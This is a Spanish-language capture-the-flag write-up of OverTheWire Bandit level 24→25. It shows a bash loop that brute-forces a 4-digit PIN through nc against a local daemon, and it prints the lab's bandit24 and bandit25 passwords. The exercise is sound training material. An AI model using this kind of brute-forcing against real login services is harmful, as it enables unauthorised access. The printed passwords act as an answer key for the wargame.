# Bandit Level 24 → Level 25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso
usuario: **bandit24**
Servidor **bandit.labs.overthewire.org**
Puerto de acceso **2220**
Contraseña: ==**VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar**==
Contraseña obtenida en el [[Nivel 23 - 24]]

## Solución
Se debe crear un codigo bash que haga un intento de fuerza bruta para encontrar la constraseña para el listener del pincode
``` bash
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done                                                                           VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000                                              VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001                                              VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002                                              VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003                                              VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004                                              VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005                                              bandit24@bandit:~$ 
```
Un ejemplo del codigo en bash a utilizar.

``` bash
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!                                     I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.                Correct!                                                                           The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d                                                                                                     Exiting. 
```
Contraseña ==**p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d**==

## Notas adicionales
grep -v palabra; filtra la palabra indicada
## Referencias
